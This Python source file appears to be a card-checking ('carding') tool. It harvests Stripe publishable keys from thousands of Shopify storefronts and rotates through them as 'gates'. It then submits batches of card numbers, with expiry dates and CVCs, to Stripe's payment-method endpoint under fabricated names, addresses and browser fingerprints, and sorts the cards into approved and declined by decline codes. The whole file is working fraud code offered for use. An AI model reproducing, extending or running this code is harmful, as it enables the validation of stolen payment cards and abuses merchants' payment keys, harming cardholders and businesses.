# Charge8_Shopify_Multi.py - Multi-Gate Shopify Checker (Optimized for 15000+ gates)
# Features: Gate rotation, connection pooling, caching, parallel validation

import requests
import re
import json
import random
import string
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote_plus, urlencode, urlparse
from collections import deque
import os

# --- Configuration ---
MAX_GATE_CACHE = 500  # Keep top 500 working gates in memory
GATE_TIMEOUT = 10  # Seconds to wait for gate response
GATE_VALIDATION_THREADS = 50  # Threads for validating gates
CARD_CHECK_THREADS = 20  # Threads for checking cards
GATE_RETRY_LIMIT = 2  # Retries per gate before marking dead

# --- Thread-safe gate management ---
class GateManager:
    """Manages a pool of Shopify gates with rotation and caching"""
    
    def __init__(self, gates_file=None, gates_list=None):
        self.all_gates = []
        self.working_gates = deque(maxlen=MAX_GATE_CACHE)
        self.dead_gates = set()
        self.gate_stats = {}  # Track success/fail per gate
        self.lock = threading.Lock()
        self.validation_in_progress = False
        
        if gates_file and os.path.exists(gates_file):
            self.load_gates_from_file(gates_file)
        elif gates_list:
            self.all_gates = list(gates_list)
        
        print(f"[GateManager] Loaded {len(self.all_gates)} gates")
    
    def load_gates_from_file(self, filepath):
        """Load gates from file (one URL per line)"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Normalize URL
                        if not line.startswith('http'):
                            line = 'https://' + line
                        self.all_gates.append(line)
        except Exception as e:
            print(f"[GateManager] Error loading gates: {e}")
    
    def get_gate(self):
        """Get a working gate (thread-safe)"""
        with self.lock:
            if self.working_gates:
                # Rotate: take from front, add to back
                gate = self.working_gates.popleft()
                self.working_gates.append(gate)
                return gate
            elif self.all_gates:
                # No validated gates, return random from all
                available = [g for g in self.all_gates if g not in self.dead_gates]
                if available:
                    return random.choice(available)
        return None
    
    def mark_working(self, gate):
        """Mark a gate as working"""
        with self.lock:
            if gate not in self.working_gates:
                self.working_gates.append(gate)
            if gate in self.dead_gates:
                self.dead_gates.discard(gate)
            # Update stats
            if gate not in self.gate_stats:
                self.gate_stats[gate] = {'success': 0, 'fail': 0}
            self.gate_stats[gate]['success'] += 1
    
    def mark_dead(self, gate):
        """Mark a gate as dead"""
        with self.lock:
            self.dead_gates.add(gate)
            if gate in self.working_gates:
                try:
                    self.working_gates.remove(gate)
                except:
                    pass
            if gate not in self.gate_stats:
                self.gate_stats[gate] = {'success': 0, 'fail': 0}
            self.gate_stats[gate]['fail'] += 1
    
    def get_stats(self):
        """Get gate statistics"""
        with self.lock:
            return {
                'total': len(self.all_gates),
                'working': len(self.working_gates),
                'dead': len(self.dead_gates),
                'untested': len(self.all_gates) - len(self.working_gates) - len(self.dead_gates)
            }

# --- Global gate manager ---
_gate_manager = None

def init_gate_manager(gates_file=None, gates_list=None):
    """Initialize the global gate manager"""
    global _gate_manager
    _gate_manager = GateManager(gates_file, gates_list)
    return _gate_manager

def get_gate_manager():
    """Get the global gate manager"""
    global _gate_manager
    return _gate_manager

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", 
             "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
             "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    num = random.randint(100, 9999)
    return f"{first.lower()}.{last.lower()}{num}@{random.choice(domains)}"

def generate_phone():
    return f"+1{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

def validate_single_gate(gate_url):
    """Validate a single gate (check if it's alive and has Stripe)"""
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        # Quick check - just see if site responds
        response = session.get(gate_url, timeout=GATE_TIMEOUT, allow_redirects=True)
        
        if response.status_code != 200:
            return None
        
        html = response.text.lower()
        
        # Check for Shopify indicators
        is_shopify = any([
            'shopify' in html,
            'cdn.shopify.com' in html,
            'myshopify.com' in response.url,
            '/cart' in html,
            '/checkout' in html,
        ])
        
        # Check for Stripe indicators
        has_stripe = any([
            'stripe' in html,
            'pk_live_' in html,
            'pk_test_' in html,
            'js.stripe.com' in html,
        ])
        
        if is_shopify or has_stripe:
            # Extract Stripe key if available
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', response.text)
            stripe_pk = pk_match.group(0) if pk_match else None
            
            return {
                'url': gate_url,
                'stripe_pk': stripe_pk,
                'is_shopify': is_shopify,
                'has_stripe': has_stripe,
            }
        
        return None
        
    except Exception as e:
        return None

def validate_gates_batch(gates, max_workers=GATE_VALIDATION_THREADS, callback=None):
    """Validate multiple gates in parallel"""
    working = []
    total = len(gates)
    checked = 0
    
    print(f"[Validator] Validating {total} gates with {max_workers} threads...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(validate_single_gate, gate): gate for gate in gates}
        
        for future in as_completed(futures):
            checked += 1
            gate = futures[future]
            
            try:
                result = future.result()
                if result:
                    working.append(result)
                    if callback:
                        callback('working', gate, result)
                else:
                    if callback:
                        callback('dead', gate, None)
            except Exception as e:
                if callback:
                    callback('error', gate, str(e))
            
            # Progress update every 100 gates
            if checked % 100 == 0:
                print(f"[Validator] Progress: {checked}/{total} ({len(working)} working)")
    
    print(f"[Validator] Complete: {len(working)}/{total} gates working")
    return working

def ShopifyMultiGateCheckout(ccx, gate_url=None, gate_manager=None):
    """
    Shopify Multi-Gate Checkout
    Uses gate rotation for high-volume checking
    
    Args:
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        gate_url (str): Specific gate URL (optional)
        gate_manager (GateManager): Gate manager instance (optional)
    Returns:
        str: Status message
    """
    # Get gate
    if not gate_url:
        gm = gate_manager or get_gate_manager()
        if gm:
            gate_url = gm.get_gate()
        
        if not gate_url:
            return "Error: No gates available"
    
    # --- Card Parsing ---
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return f"Error: Invalid year format: {yy}"
        
        mm = mm.zfill(2)
        
    except Exception as e:
        return f"Error parsing card: {e}"

    # --- Session Setup ---
    session = requests.Session()
    ua = random.choice(USER_AGENTS)
    
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    phone = generate_phone()
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ"])
    postal = f"{random.randint(10000, 99999)}"
    country = "US"

    gm = gate_manager or get_gate_manager()
    
    try:
        # --- Step 1: Access Store ---
        try:
            response = session.get(gate_url, timeout=GATE_TIMEOUT)
            if response.status_code != 200:
                if gm:
                    gm.mark_dead(gate_url)
                return f"Error: Gate returned {response.status_code}"
        except requests.exceptions.Timeout:
            if gm:
                gm.mark_dead(gate_url)
            return "Error: Gate timeout"
        except Exception as e:
            if gm:
                gm.mark_dead(gate_url)
            return f"Error: Gate connection failed"
        
        html = response.text
        
        # --- Step 2: Extract Stripe Key ---
        pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', html)
        if not pk_match:
            # Try to find in scripts
            script_match = re.search(r'Stripe\(["\']?(pk_[^"\']+)["\']?\)', html)
            if script_match:
                stripe_pk = script_match.group(1)
            else:
                if gm:
                    gm.mark_dead(gate_url)
                return "Error: No Stripe key found on gate"
        else:
            stripe_pk = pk_match.group(0)
        
        # Gate is working - mark it
        if gm:
            gm.mark_working(gate_url)
        
        # --- Step 3: Create Payment Method ---
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        
        pm_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': ua,
        }
        
        guid = f"NA-{generate_random_string(36)}"
        muid = f"NA-{generate_random_string(36)}"
        sid = f"NA-{generate_random_string(36)}"
        
        pm_data = {
            'type': 'card',
            'billing_details[name]': f"{first_name} {last_name}",
            'billing_details[email]': email,
            'billing_details[phone]': phone,
            'billing_details[address][line1]': street,
            'billing_details[address][city]': city,
            'billing_details[address][state]': state,
            'billing_details[address][postal_code]': postal,
            'billing_details[address][country]': country,
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/v3',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': stripe_pk,
        }
        
        try:
            pm_response = session.post(pm_url, headers=pm_headers, 
                                       data=urlencode(pm_data), timeout=30)
            
            if pm_response.status_code == 200:
                pm_json = pm_response.json()
                pm_id = pm_json.get('id')
                
                if pm_id:
                    card_brand = pm_json.get('card', {}).get('brand', 'Unknown').upper()
                    last_4 = pm_json.get('card', {}).get('last4', n[-4:])
                    
                    # Success - card is valid
                    domain = urlparse(gate_url).netloc
                    return f"Approved | {card_brand} ****{last_4} | {domain}"
                else:
                    return "Error: No PM ID returned"
                    
            elif pm_response.status_code == 402:
                # Card declined
                try:
                    error_json = pm_response.json()
                    error_msg = error_json.get('error', {}).get('message', 'Declined')
                    decline_code = error_json.get('error', {}).get('decline_code', '')
                    code = error_json.get('error', {}).get('code', '')
                    
                    if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                        return "Insufficient funds."
                    elif 'incorrect_cvc' in error_msg.lower() or decline_code == 'incorrect_cvc':
                        return "Your card's security code is incorrect."
                    elif 'expired' in error_msg.lower() or decline_code == 'expired_card':
                        return "Your card has expired."
                    elif 'incorrect_number' in error_msg.lower() or code == 'incorrect_number':
                        return "Your card number is incorrect."
                    elif decline_code == 'card_declined':
                        return "Your card was declined."
                    elif decline_code == 'do_not_honor':
                        return "Declined (Do Not Honor)"
                    elif decline_code == 'lost_card':
                        return "Declined (Lost Card)"
                    elif decline_code == 'stolen_card':
                        return "Declined (Stolen Card)"
                    else:
                        return f"Declined ({error_msg[:50]})"
                except:
                    return "Your card was declined."
                    
            elif pm_response.status_code == 401:
                # Key invalid - mark gate as dead
                if gm:
                    gm.mark_dead(gate_url)
                return "Error: Gate key invalid (401)"
                
            else:
                return f"Error: Stripe HTTP {pm_response.status_code}"
                
        except requests.exceptions.Timeout:
            return "Error: Stripe timeout"
        except Exception as e:
            return f"Error: Stripe request failed"
            
    except Exception as e:
        return f"Error: Gateway error - {str(e)[:30]}"

# --- Batch Processing ---
def check_cards_batch(cards, gate_manager=None, max_workers=CARD_CHECK_THREADS, callback=None):
    """
    Check multiple cards in parallel using gate rotation
    
    Args:
        cards: List of card strings
        gate_manager: GateManager instance
        max_workers: Number of parallel threads
        callback: Function(card, result) called for each result
    
    Returns:
        dict: Results summary
    """
    results = {
        'approved': [],
        'declined': [],
        'errors': [],
    }
    
    total = len(cards)
    checked = 0
    
    print(f"[Checker] Checking {total} cards with {max_workers} threads...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(ShopifyMultiGateCheckout, card, None, gate_manager): card 
            for card in cards
        }
        
        for future in as_completed(futures):
            checked += 1
            card = futures[future]
            
            try:
                result = future.result()
                
                if 'Approved' in result or 'Charged' in result:
                    results['approved'].append((card, result))
                elif 'Error' in result:
                    results['errors'].append((card, result))
                else:
                    results['declined'].append((card, result))
                
                if callback:
                    callback(card, result)
                    
            except Exception as e:
                results['errors'].append((card, str(e)))
                if callback:
                    callback(card, f"Error: {e}")
            
            # Progress update
            if checked % 50 == 0:
                print(f"[Checker] Progress: {checked}/{total} "
                      f"(✅{len(results['approved'])} ❌{len(results['declined'])} ⚠️{len(results['errors'])})")
    
    print(f"[Checker] Complete: ✅{len(results['approved'])} ❌{len(results['declined'])} ⚠️{len(results['errors'])}")
    return results

# --- Convenience function for single gate ---
ShopifyCheckout = ShopifyMultiGateCheckout

# --- Example Usage ---
if __name__ == "__main__":
    print("="*60)
    print("SHOPIFY MULTI-GATE CHECKER")
    print("="*60)
    
    # Example: Initialize with a gates file
    # gm = init_gate_manager(gates_file='shopify_gates.txt')
    
    # Example: Initialize with a list
    example_gates = [
        "https://example-store.myshopify.com",
        "https://another-store.com",
    ]
    
    print("\nTo use with 15000 gates:")
    print("1. Create a file 'gates.txt' with one URL per line")
    print("2. Run: gm = init_gate_manager(gates_file='gates.txt')")
    print("3. Validate gates: validate_gates_batch(gm.all_gates[:1000])")
    print("4. Check cards: check_cards_batch(cards, gm)")
    print()
    print("Or use the VPS checker:")
    print("python3 mady_vps_checker_v4.py cards.txt --gateway shopify-multi --gates-file gates.txt")
